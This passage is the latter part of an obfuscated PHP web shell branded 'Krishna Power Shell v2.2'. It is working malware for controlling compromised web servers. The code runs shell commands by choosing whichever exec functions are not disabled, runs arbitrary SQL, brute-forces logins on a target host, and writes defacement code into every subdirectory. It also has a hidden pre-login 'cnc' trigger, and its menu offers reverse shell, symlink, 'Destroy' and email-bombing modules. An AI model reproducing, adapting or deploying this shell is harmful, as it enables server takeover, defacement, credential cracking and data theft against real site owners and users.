                                        foreach($fetch1 as $key=>$val){echo"<div class='sql-td'>".$val."</div>";}
                                        echo"</div>";
                                    }
                                    echo"</div>";
                                    $total_row=mysqli_num_rows($query1);
                                    if($total_row>0){
                                        echo"<form action='' method='GET' class='limit-form'><input type='hidden' value='sql' name='dfaction'><input type='hidden' value='".$dbs."' name='dbname'><input type='hidden' value='".$tbl."' name='tbname'><label>Set offset,limit</label><input type='text' placeholder='eg: 20,50' name='limit'><input type='submit' value='Lets Go'></form>";
                                    }
                                    echo"</div>";
                                }else{
                                    $limits=explode(',',$GLOBALS['kk1'][0]['limit']);
                                    $offset=intval($limits[0]);$limit=intval($limits[1]);
                                    mysqli_select_db($conn,$dbs);
                                    $tbl=mysqli_real_escape_string($conn,$GLOBALS['kk1'][0]['tbname']);
                                    $sql="select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1="select * from $tbl limit $offset,$limit";
                                    $query=mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1=mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo"<div class='sql-table'><div class='sql-header'>";
                                    while($fetch=mysqli_fetch_assoc($query)){echo"<div class='sql-th'>".$fetch['column_name']."</div>";}
                                    echo"</div>";
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo"<div class='sql-row'>";
                                        foreach($fetch1 as $key=>$val){echo"<div class='sql-td'>".$val."</div>";}
                                        echo"</div>";
                                    }
                                    echo"</div>";
                                    $total_row=mysqli_num_rows($query1);
                                    if($total_row>0){
                                        echo"<form action='' method='GET' class='limit-form'><input type='hidden' value='sql' name='dfaction'><input type='hidden' value='".$dbs."' name='dbname'><input type='hidden' value='".$tbl."' name='tbname'><label>Set offset,limit</label><input type='text' placeholder='eg: 20,50' name='limit'><input type='submit' value='Lets Go'></form>";
                                    }
                                    echo"</div>";
                                }
                            }
                        }else{
                            $sql="select schema_name from information_schema.schemata";
                            $query=mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch=mysqli_fetch_assoc($query)){echo"<a href='?dfaction=sql&dbname=".$fetch['schema_name']."'>".$fetch['schema_name']."</a><br>";}
                            echo"</div>";
                        }
                        if(isset($GLOBALS['kk1'][1]['sqllogout'])){$_SESSION['sql_auth']=null;unset($_SESSION['sql_auth']);echo"<script>window.location.replace('?dfaction=sql');</script>";}
                        if(isset($GLOBALS['kk1'][1]['sqlcmd'])){$sqlcmd=$GLOBALS['kk1'][1]['sqlcmd'];$qrycmd=mysqli_query($conn,$sqlcmd) or exit(mysqli_error($conn));$this->k1(1,"SQL Query","Command successfully executed!","",true);}
                    }
                }else{
                    if(!isset($GLOBALS['kk1'][1]['connect_sql'])){
                        echo'<div class="sql-form"><h3>🐬 MySQL Connection</h3><form action="" method="POST"><input type="text" name="sqlhost" placeholder="Host" required><input type="text" name="sqluser" placeholder="Username" required><input type="password" name="sqlpass" placeholder="Password" required><button type="submit" name="connect_sql">Connect</button></form></div>';
                    }else{
                        $tmp_conn=mysqli_connect($GLOBALS['kk1'][1]['sqlhost'],$GLOBALS['kk1'][1]['sqluser'],$GLOBALS['kk1'][1]['sqlpass']) or exit($this->k1(2,"MySQL Connection","Cannot connect to database!","",true));
                        if(!mysqli_connect_errno()){$_SESSION['sql_auth']=$GLOBALS['kk1'][1]['sqlhost']."|--|".$GLOBALS['kk1'][1]['sqluser']."|--|".$GLOBALS['kk1'][1]['sqlpass'];echo"<script>window.location.replace(window.location.href);</script>";}
                        else{echo"Failed to connect mysql";exit;}
                    }
                }
                echo"</div>";
            break;
            case"logout":
                unset($_SESSION['krishna_auth']);session_destroy();
                echo"<script>window.location.replace('".$GLOBALS['kk1'][2]['PHP_SELF']."')</script>";
            break;
            case"crack":
                if(!isset($GLOBALS['kk1'][1]['crack'])){
                    echo'<div class="crack-form"><h3>🔓 Brute Force Cracker</h3><form action="" method="POST"><input type="text" name="host" placeholder="Target Host" required><input type="text" name="portc" placeholder="Port" value="80"><textarea name="userlist" placeholder="Username List (one per line)" required></textarea><textarea name="passlist" placeholder="Password List (one per line)" required></textarea><input type="text" name="timeout" placeholder="Timeout (seconds)" value="10"><button type="submit" name="crack">Start Cracking</button></form></div>';
                }else{
                    $host=$GLOBALS['kk1'][1]['host'];
                    $user=explode("\n",$GLOBALS['kk1'][1]['userlist']);
                    $pass=explode("\n",$GLOBALS['kk1'][1]['passlist']);
                    $port=$GLOBALS['kk1'][1]['portc'];
                    $timeout=$GLOBALS['kk1'][1]['timeout'];
                    echo"<div class='crackresults'>";
                    foreach($user as $u){
                        print("<p class='gold'>🎯 Trying for user -> ".$u."</p>");
                        foreach($pass as $p){$this->k22(trim($host),$port,trim($u),trim($p),trim($timeout));}
                    }
                    echo"<p class='green'>✅ Done!</p></div>";
                }
            break;
            case"mass":
                $s=$this->k6();
                echo"<div class='mass'>";
                if(!isset($GLOBALS['kk1'][1]['dfmass'])){
                    echo'<div class="mass-form"><h3>🔥 Mass Defacement</h3><form action="" method="POST"><input type="text" name="masspath" placeholder="Target Directory Path" required><input type="text" name="massname" placeholder="File Name (e.g., index.html)" required><textarea name="codemass" placeholder="HTML/PHP Code to Inject"></textarea><input type="text" name="fromurl" placeholder="OR Get Code From URL"><button type="submit" name="dfmass">Execute Mass Deface</button></form></div>';
                }else{
                    $arrpath=glob($GLOBALS['kk1'][1]['masspath'].$s.'*',GLOB_ONLYDIR);
                    if(!empty($GLOBALS['kk1'][1]['fromurl'])&&$GLOBALS['kk1'][1]['fromurl']!==""&&$GLOBALS['kk1'][1]['fromurl']!==NULL){
                        if(filter_var($GLOBALS['kk1'][1]['fromurl'],FILTER_VALIDATE_URL)){$ncode=file_get_contents($GLOBALS['kk1'][1]['fromurl']);}
                        else{die("<script>alert('Check url');window.location.replace(window.location.href);</script>");}
                    }else{$ncode=$GLOBALS['kk1'][1]['codemass']?:'🚩 Jai Shri Krishna! 🚩';}
                    $lekluh=$GLOBALS['kk1'][1]['masspath'].$s.$GLOBALS['kk1'][1]['massname'];
                    $rakluh=fopen($lekluh,'w');fwrite($rakluh,$ncode);
                    foreach($arrpath as $p){$npath=$p.$s.$GLOBALS['kk1'][1]['massname'];$nopen=fopen($npath,'w');fwrite($nopen,$ncode);fclose($nopen);}
                    fclose($rakluh);
                    $this->k1(1,"Mass defacements","All file successfully created! Hare Krishna!","",true);
                }
                echo"</div>";
            break;
        }
    }

    public function k18($c){
        if(isset($GLOBALS['kk1'][0]['dfp'])){$GLOBALS['kk2'][3]($this->k4($GLOBALS['kk1'][0]['dfp']));}
        else{$GLOBALS['kk2'][3]($GLOBALS['kk1'][2]['DOCUMENT_ROOT']);}
        if($this->k23('ini','disable_functions')!=="None"){
            $disCMD=explode(",",$this->k23('ini','disable_functions'));
            $disCMD=array_map('trim',$disCMD);
            foreach($GLOBALS['kk3'] as $cmd){
                if(!in_array($cmd,$disCMD)){
                    $availCMD=$cmd;
                    switch($availCMD){
                        case$GLOBALS['kk3'][4]:return$this->k24($c);break;
                        case$GLOBALS['kk3'][1]:case$GLOBALS['kk3'][2]:print($availCMD($c));return$GLOBALS['kk3'][1]($c);break;
                        default:return$availCMD($c);break;
                    }
                    break;
                }
            }
        }else{return system($c);}
    }

    private function k24($c){
        $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $e=$c;
        $p=$GLOBALS['kk3'][4]($e,$d,$pipes,null,null);
        if(is_resource($p)){$ret=$GLOBALS['kk2'][14]($pipes[1]);echo$ret;proc_close($p);}
        else{echo"Fail to execute!";}
    }

    private function k25(){
        $p=array("A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:");
        $a=array();
        foreach($p as $part){if(is_dir($part)){array_push($a,$part);}}
        return$a;
    }

    private function k22($h,$p,$u,$pass,$t){
        $ch=curl_init();
        $qdata=array('user'=>$u,'pass'=>$pass,'goto_uri'=>'/');
        curl_setopt($ch,CURLOPT_URL,"https://$h:".$p."/login/?login_only=1");
        curl_setopt($ch,CURLOPT_HEADER,TRUE);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$qdata);
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$t);
        curl_setopt($ch,CURLOPT_FAILONERROR,1);
        $data=curl_exec($ch);
        $httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE);
        if(curl_errno($ch)==28){
            print"<span class='orange'>Error: Connection Timeout, Sleep for 5s.</span><br>";
            sleep(5);
        }else if(curl_errno($ch)==0){
            print"<span class='green'>[~] Cracking Success With Username \"$u\" and Password \"$pass\"</span><br><br>";
        }else{
            if($httpcode===0){
                echo"No response <br>";
                curl_setopt($ch,CURLOPT_URL,"http://$h:".$p);
                curl_setopt($ch,CURLOPT_HEADER,TRUE);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                $cont=curl_exec($ch);
                $farr=explode("URL=",$cont);
                $narr=explode('"></head>',$farr[1]);
                echo"Please change to this host -> ".$narr[0];
                exit;
            }
        }
        curl_close($ch);
    }

    public function k15($s){
        echo"<div class='currentfolder'>🔱 Current folder : ";
        $tp=array();
        if(isset($GLOBALS['kk1'][0]['dfp'])){$path=$this->k14($this->k4($GLOBALS['kk1'][0]['dfp']));$path=$this->k4($path);}
        else{$path=getcwd();}
        $dfsp=explode($s,$path);
        $dfssz=sizeof(($dfsp));
        $dfsge="";
        for($c=0;$c<$dfssz;$c++){array_push($tp,$dfsp[$c]);}
        if($GLOBALS['kk4']!=='win'){$es=$this->k14($s);echo"<a href='?dfp=".urlencode($es)."'>$s</a>";}
        for($i=0;$i<sizeof($tp);$i++){
            if(!empty($dfsp[$i])||!$dfsp[$i]==""){
                if($GLOBALS['kk4']!=='win'){$dfsge.=$s.$dfsp[$i];}
                else{$dfsge.=$dfsp[$i].$s;}
                $dfspn=$this->k14($dfsge);
                echo"<a href='?dfp=".urlencode($dfspn)."'>$dfsp[$i]</a>".$s;
            }
        }
        echo"</div>";
    }

    public function k20($f){
        if($GLOBALS['kk4']!=='win'){
            $of=(fileowner($f)?:0);
            $gf=(filegroup($f)?:0);
            $cp=$this->k23('ini','disable_functions');
            if($cp!=="None"){
                $cp=explode(",",$cp);
                if(!in_array("posix_getpwuid",$cp)){
                    $ownx=posix_getpwuid($of)['name']?:'nobody';
                    $grpx=posix_getpwuid($gf)['name'];
                    if(($ownx!==NULL&&$ownx!=="")||($grpx!==NULL&&$grpx!=="")){$og=$ownx.':'.($grpx?:$ownx);}
                    else{$og="nobody:nobody";}
                }else{$og="-:-";}
            }else{
                $ownx=posix_getpwuid($of)['name']?:'nobody';
                $grpx=posix_getpwuid($gf)['name'];
                if(($ownx!==NULL&&$ownx!=="")||($grpx!==NULL&&$grpx!=="")){$og=$ownx.':'.($grpx?:$ownx);}
                else{$og="nobody:nobody";}
            }
        }else{$og="-:-";}
        return$og;
    }

    public function k21($f){
        $p=$GLOBALS['kk2'][1]($f);
        if(($p&0xC000)==0xC000){$i='s';}elseif(($p&0xA000)==0xA000){$i='l';}elseif(($p&0x8000)==0x8000){$i='-';}elseif(($p&0x6000)==0x6000){$i='b';}elseif(($p&0x4000)==0x4000){$i='d';}elseif(($p&0x2000)==0x2000){$i='c';}elseif(($p&0x1000)==0x1000){$i='p';}else{$i='u';}
        $i.=(($p&0x0100)?'r':'-');
        $i.=(($p&0x0080)?'w':'-');
        $i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
        $i.=(($p&0x0020)?'r':'-');
        $i.=(($p&0x0010)?'w':'-');
        $i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
        $i.=(($p&0x0004)?'r':'-');
        $i.=(($p&0x0002)?'w':'-');
        $i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
        return$i;
    }

    private function k16($c){return substr(sprintf("%o",$c),-4);}

    public function k17($l,$c){
        $def=0;
        for($i=strlen($c)-1;$i>=0;--$i){$def+=(int)$c[$i]*pow(8,(strlen($c)-$i-1));}
        if(is_dir($l)||is_file($l)){if(chmod($l,$def)){return true;}else{return false;}}
    }

    public function k23($ch,$v){
        switch(strtolower($ch)){
            case'ini':
                if(strtolower($v)!=='disable_functions'){
                    if(!ini_get($v)){return"OFF";}else{return"ON";}
                }else{
                    if(!ini_get($v)){return"None";}else{return ini_get($v);}
                }
            break;
            case'func':
                if(!function_exists($v)){return"OFF";}else{return"ON";}
            break;
        }
    }

    public function k26(){
        $disklink="";
        $diskavail=$this->k25();
        foreach($diskavail as $item){$diskstr=$item."\\";$this->krishna=$diskstr;$disklink.="<a href='?dfp=".$this->k3()."'>$diskstr</a> ";}
        $c="<div class='server-info'><div class='info-row'><span class='info-label'>🖥️ Server:</span><span class='info-value'>".substr(@php_uname(),0,60)."</span></div><div class='info-row'><span class='info-label'>🌐 Software:</span><span class='info-value'>".$GLOBALS['kk1'][2]['SERVER_SOFTWARE']."</span></div><div class='info-row'><span class='info-label'>👤 User:</span><span class='info-value'>".get_current_user()."</span><span class='info-label'>💾 Free:</span><span class='info-value'>".$this->k7(diskfreespace($GLOBALS['kk1'][2]['DOCUMENT_ROOT']))."</span></div><div class='info-row'><span class='info-label'>📍 Server IP:</span><span class='info-value'>".$GLOBALS['kk1'][2]['SERVER_ADDR']."</span><span class='info-label'>🖥️ Your IP:</span><span class='info-value'>".$GLOBALS['kk1'][2]['REMOTE_ADDR']."</span></div><div class='info-row'><span class='info-label'>🛡️ Safe Mode:</span><span class='info-value'>".$this->k23('ini','safe_mode')."</span><span class='info-label'>🚫 Disabled:</span><span class='info-value'>".$this->k23('ini','disable_functions')."</span></div><div class='info-row'><span class='info-label'>🔗 cURL:</span><span class='info-value'>".$this->k23('func','curl_version')."</span><span class='info-label'>🐬 MySQL:</span><span class='info-value'>".$this->k23('func','mysql_connect')."</span></div><div class='info-row'><span class='info-label'>📁 Document Root:</span><span class='info-value'>".$GLOBALS['kk1'][2]['DOCUMENT_ROOT']."</span></div></div>%{main}%";
        return$c;
    }

    public function k27($a,$c){
        $as=sizeof($a);$x=1;
        for($i=0;$i<$as;$i++){$c=$this->k19("/%{A".$x."}%/i",$a[$i],$c);$x++;}
        return$c;
    }

    public function k19($p,$r,$f){return preg_replace($p,$r,$f);}

    public function k28(){
        return'<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>🔱 Krishna Power Shell 🔱</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Courier New",monospace;
    background:linear-gradient(135deg,#0a0a0a 0%,#1a0a0a 50%,#0d0b0d 100%);
    min-height:100vh;
}
.krishna-container{
    max-width:1400px;
    margin:0 auto;
    padding:12px;
}
.top-image{
    text-align:center;
    margin-bottom:15px;
    border-radius:16px;
    overflow:hidden;
    box-shadow:0 0 25px rgba(212,175,55,0.25);
}
.top-image img{
    width:100%;
    max-height:150px;
    object-fit:cover;
    border-radius:16px;
    border:1px solid #D4AF37;
}
.horizontal-menu{
    background:rgba(0,0,0,0.85);
    backdrop-filter:blur(10px);
    border-radius:12px;
    margin-bottom:15px;
    padding:8px 12px;
    border:1px solid #D4AF37;
    display:flex;
    flex-wrap:wrap;
    justify-content:center;
    gap:5px;
}
.horizontal-menu a{
    color:#D4AF37;
    text-decoration:none;
    padding:6px 12px;
    background:rgba(212,175,55,0.08);
    border-radius:20px;
    transition:all 0.2s ease;
    font-size:12px;
    font-weight:500;
    border:1px solid rgba(212,175,55,0.2);
    white-space:nowrap;
}
.horizontal-menu a:hover{
    background:rgba(212,175,55,0.25);
    transform:translateY(-2px);
    border-color:#D4AF37;
}
.server-info{
    background:rgba(0,0,0,0.5);
    border-radius:12px;
    padding:10px;
    margin-bottom:15px;
    font-size:11px;
}
.info-row{
    display:flex;
    flex-wrap:wrap;
    gap:10px;
    margin-bottom:5px;
    border-bottom:1px solid rgba(212,175,55,0.1);
    padding-bottom:4px;
}
.info-label{
    color:#D4AF37;
    font-weight:600;
    min-width:85px;
}
.info-value{
    color:#FFD966;
    word-break:break-all;
}
.content-area{
    background:rgba(0,0,0,0.85);
    backdrop-filter:blur(10px);
    border-radius:16px;
    padding:15px;
    border:1px solid #D4AF37;
    overflow-x:auto;
}
.currentfolder{
    background:rgba(0,0,0,0.5);
    padding:8px 12px;
    border-radius:8px;
    margin-bottom:15px;
    color:#D4AF37;
    font-size:12px;
    border-left:3px solid #D4AF37;
    word-break:break-all;
}
.currentfolder a{color:#FFD966;text-decoration:none;}
.currentfolder a:hover{text-decoration:underline;}
.directory{
    overflow-x:auto;
}
.table-responsive{
    overflow-x:auto;
}
.table-wrapper{
    min-width:750px;
}
.krishna-table{
    display:flex;
    flex-direction:column;
    font-size:11px;
}
.table-header,.table-row{
    display:flex;
    flex-wrap:nowrap;
    border-bottom:1px solid rgba(212,175,55,0.2);
}
.table-header{
    background:rgba(212,175,55,0.1);
    font-weight:bold;
    color:#D4AF37;
}
.th,.td{
    padding:6px 5px;
    word-break:break-word;
}
.th{font-weight:600;}
.th:nth-child(1),.td:nth-child(1){width:35px;text-align:center;}
.th:nth-child(2),.td:nth-child(2){width:40px;text-align:center;}
.th:nth-child(3),.td:nth-child(3){flex:2;min-width:140px;}
.th:nth-child(4),.td:nth-child(4){width:65px;}
.th:nth-child(5),.td:nth-child(5){width:90px;}
.th:nth-child(6),.td:nth-child(6){width:70px;}
.th:nth-child(7),.td:nth-child(7){width:100px;}
.th:nth-child(8),.td:nth-child(8){width:110px;}
.td a{color:#FFD966;text-decoration:none;}
.td a:hover{color:#D4AF37;}
input,textarea,select{
    background:rgba(0,0,0,0.7);
    border:1px solid #D4AF37;
    color:#D4AF37;
    padding:6px 10px;
    border-radius:6px;
    outline:none;
    font-family:monospace;
    font-size:12px;
}
input:focus,textarea:focus,select:focus{
    border-color:#FFD700;
    box-shadow:0 0 5px rgba(212,175,55,0.4);
}
button,input[type="submit"]{
    background:linear-gradient(135deg,#D4AF37,#B8960C);
    color:#0a0a0a;
    border:none;
    padding:5px 16px;
    border-radius:20px;
    cursor:pointer;
    font-weight:bold;
    font-size:12px;
    transition:all 0.2s ease;
}
button:hover,input[type="submit"]:hover{
    transform:translateY(-1px);
    box-shadow:0 3px 12px rgba(212,175,55,0.4);
}
.editcontent{
    width:100%;
    min-height:350px;
    font-family:monospace;
    font-size:11px;
    background:#0a0a0a;
    color:#FFD966;
    border:1px solid #D4AF37;
    border-radius:8px;
    padding:10px;
}
.cmd_response{
    width:100%;
    height:280px;
    background:#0a0a0a;
    color:#FFD966;
    font-family:monospace;
    font-size:11px;
    border:1px solid #D4AF37;
    border-radius:8px;
    padding:8px;
}
.action-bar{
    margin-top:15px;
    padding:10px;
    background:rgba(0,0,0,0.4);
    border-radius:8px;
    display:flex;
    gap:10px;
    align-items:center;
    flex-wrap:wrap;
}
::-webkit-scrollbar{width:5px;height:5px;}
::-webkit-scrollbar-track{background:#0a0a0a;}
::-webkit-scrollbar-thumb{background:#D4AF37;border-radius:3px;}
.sources{
    background:#0a0a0a;
    padding:10px;
    border-radius:8px;
    overflow-x:auto;
    font-size:11px;
}
.sources code{color:#FFD966;font-family:monospace;}
.krishna-footer{
    text-align:center;
    margin-top:15px;
    padding:8px;
    background:rgba(0,0,0,0.4);
    border-radius:8px;
    color:rgba(212,175,55,0.6);
    font-size:10px;
}
h3{
    color:#D4AF37;
    margin-bottom:10px;
    font-size:15px;
    border-bottom:1px solid #D4AF37;
    padding-bottom:5px;
}
.gold{color:#D4AF37;}
.teal{color:#FFD966;}
.green{color:#4ECDC4;}
.red{color:#FF6B6B;}
.orange{color:#FFA500;}
.center{text-align:center;}
.form-row{
    margin-bottom:8px;
    display:flex;
    flex-wrap:wrap;
    gap:8px;
    align-items:center;
}
.form-row label{
    color:#D4AF37;
    min-width:100px;
    font-size:12px;
}
.form-row input,.form-row textarea{
    flex:1;
    min-width:150px;
}
textarea{
    width:100%;
    min-height:70px;
}
.modarea,.editform,.cmd-area,.symlinkarea,.reverse,.configs,.unzip-area,.databases,.mass,.crack-form,.sql-form,.bombing,.rename-area{
    color:#ccc;
    font-size:12px;
}
.unzip-small{
    margin-left:4px;
    padding:2px 5px;
    font-size:9px;
}
.reverse-output{
    display:block;
    background:#0a0a0a;
    padding:8px;
    border-radius:6px;
    margin-top:8px;
    font-size:10px;
    white-space:pre-wrap;
    word-break:break-all;
}
.sql-table{
    overflow-x:auto;
    margin-top:8px;
}
.sql-header,.sql-row{
    display:flex;
    flex-wrap:nowrap;
    border-bottom:1px solid rgba(212,175,55,0.2);
}
.sql-th,.sql-td{
    padding:5px;
    min-width:90px;
    font-size:10px;
}
.sql-th{
    background:rgba(212,175,55,0.15);
    color:#D4AF37;
    font-weight:bold;
}
.sql-td{color:#ccc;}
.limit-form{
    margin-top:8px;
    display:flex;
    flex-wrap:wrap;
    gap:8px;
    align-items:center;
}
.red-btn{
    background:#FF6B6B;
    color:#fff;
}
@media (max-width:768px){
    .krishna-container{padding:8px;}
    .horizontal-menu a{padding:4px 8px;font-size:10px;}
    .info-row{flex-direction:column;gap:3px;}
    .info-label{min-width:auto;}
    .th,.td{padding:4px 3px;font-size:9px;}
    .th:nth-child(5),.td:nth-child(5){width:70px;}
    .th:nth-child(7),.td:nth-child(7){width:85px;}
    .form-row{flex-direction:column;align-items:stretch;}
    .form-row label{min-width:auto;}
    .top-image img{max-height:100px;}
    .content-area{padding:10px;}
}
@media (max-width:480px){
    .horizontal-menu{gap:3px;}
    .horizontal-menu a{padding:3px 6px;font-size:9px;}
    .th:nth-child(4),.td:nth-child(4){width:45px;}
    .th:nth-child(6),.td:nth-child(6){width:55px;}
    button,input[type="submit"]{padding:3px 10px;font-size:10px;}
}
</style>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
<div class="krishna-container">
<div class="top-image">
<img src="https://i.pinimg.com/736x/4b/5f/94/4b5f94ac0365b00435173287e8094f39.jpg" alt="Lord Krishna">
</div>
<div class="horizontal-menu">
<a href="%{A1}%"><i class="fas fa-home"></i> 🏠 Home</a>
<a href="%{A2}%"><i class="fas fa-database"></i> 📋 Config</a>
<a href="%{A3}%"><i class="fas fa-plug"></i> 🔄 Reverse</a>
<a href="%{A4}%"><i class="fas fa-link"></i> 🔗 Symlink</a>
<a href="%{A5}%"><i class="fas fa-bug"></i> 🔓 Cracker</a>
<a href="%{A6}%"><i class="fas fa-terminal"></i> 💻 CMD</a>
<a href="%{A7}%"><i class="fas fa-fire"></i> 🔥 Mass</a>
<a href="%{A8}%"><i class="fas fa-database"></i> 🐬 SQL</a>
<a href="%{A9}%"><i class="fas fa-skull"></i> 💀 Destroy</a>
<a href="%{A10}%"><i class="fas fa-envelope"></i> 📧 Bombing</a>
<a href="%{A11}%"><i class="fas fa-sign-out-alt"></i> 🚪 Logout</a>
</div>
<div class="content-area">
%{body}%
</div>
<div class="krishna-footer">🔱 Krishna Power Shell v2.2 | Jai Shri Krishna! 🔱 | Golden Edition</div>
</div>
</body>
</html>';
    }

    public function k29($l,$p,$f){
        $c='<div class="krishna-body">%{main}%</div>';
        $f=$this->k19($p,$c,$f);
        return$f;
    }

    public function k30(){return'';}

    public function k31(){
        $this->k13('upload');
        $this->k13('mkdir');
        $this->k13('mkfile');
    }

    public function k14($path){
        if($GLOBALS['kk4']!=='win'){$x=preg_replace("/%2F%2F/i","/",(urlencode($path)));}
        else{$x=preg_replace("/%5C%5C/i","\\",(urlencode($path)));}
        $this->krishna=urldecode($x);
        return$this->k3();
    }
}

$krishna=new KrishnaShell();

if(!isset($_SESSION['krishna_auth'])||empty($_SESSION['krishna_auth'])){
    if(isset($GLOBALS['kk1'][1]['login'])){
        $krishna->krishna=$GLOBALS['kk1'][1]['password'];
        if($krishna->k5(urlencode($krishna->k3()))){
            header('Location: '.$GLOBALS['kk1'][2]['REQUEST_URI']);
        }
    }else{
        echo$krishna->k28();
        if(isset($GLOBALS['kk1'][0]['cnc'])){
            $comex=explode(";",$GLOBALS['kk1'][0]['cnc']);
            if(is_array($comex)&&count($comex)>1){
                $krishna->triggered($comex[0],$comex[1]);
            }
        }
    }
}else{
    if(isset($GLOBALS['kk1'][0]['dfd'])&&isset($GLOBALS['kk1'][0]['dfp'])&&isset($GLOBALS['kk1'][0]['dfaction'])){
        if(!empty($GLOBALS['kk1'][0]['dfd'])&&!empty($GLOBALS['kk1'][0]['dfp'])&&$GLOBALS['kk1'][0]['dfaction']=='download'){
            $krishna->krishna1=array($GLOBALS['kk1'][0]['dfp'],$GLOBALS['kk1'][0]['dfd']);
            $krishna->k13($GLOBALS['kk1'][0]['dfaction']);
        }else{echo"Path/File Undefined!";}
    }else{
        $c=$krishna->k28();
        $ch=$krishna->k26();
        if(isset($kk1[0]['dfp'])){$cmdx="?dfp=".urlencode($kk1[0]['dfp'])."&dfaction=cmd";}else{$cmdx="?dfaction=cmd";}
        $tr=array($GLOBALS['kk1'][2]['PHP_SELF'],"?dfaction=conf","?dfaction=reverse","?dfaction=sym","?dfaction=crack",$cmdx,"?dfaction=mass","?dfaction=sql","?dfaction=dest","?dfaction=bombing","?dfaction=logout");
        $c=$krishna->k19("/%{body}%/i","%{DFSI}%",$c);
        $c=$krishna->k19("/%{DFSI}%/i",$ch,$c);
        $c=$krishna->k29("bodytop.html","/%{main}%/i",$c);
        $c=$krishna->k27($tr,$c);
        echo$c;
        if(!isset($kk1[0]['dfp'])){
            if(!isset($kk1[0]['dfaction'])||empty($kk1[0]['dfaction'])){
                $krishna->krishna=$kk2[4]();
                $krishna->krishna1=array($krishna->k3(),null);
                $krishna->k13("scand");
            }else{
                if(in_array($kk1[0]['dfaction'],$GLOBALS['kk5'])){$krishna->k13($kk1[0]['dfaction']);}
            }
            $krishna->k31();
        }else{
            if(isset($kk1[0]['dff'])){
                if(!isset($kk1[0]['dfaction'])){
                    $krishna->krishna1=array($kk1[0]['dfp'],$kk1[0]['dff']);
                    $krishna->k13('view');
                }else{
                    $krishna->krishna1=array($kk1[0]['dfp'],$kk1[0]['dff']);
                    $krishna->k13($kk1[0]['dfaction']);
                }
            }else{
                if(isset($kk1[0]['dfaction'])){
                    $krishna->krishna1=array($kk1[0]['dfp'],null);
                    $krishna->k13($kk1[0]['dfaction']);
                }else{
                    $krishna->krishna1=array($kk1[0]['dfp'],null);
                    $krishna->k13('scand');
                }
            }
            $krishna->krishna1=array($kk1[0]['dfp'],null);
            $krishna->k31();
        }
        if(isset($kk1[1]['toencstr'])){$krishna->krishna=$kk1[1]['encstr'];$krishna->k1(1,"Encryption for ".$kk1[1]['encstr'],$krishna->k3(),"So you can change password",true);}
        $krishna->k13("zipping");
        $krishna->k13("massdel");
        print($krishna->k30());
    }
}
?>
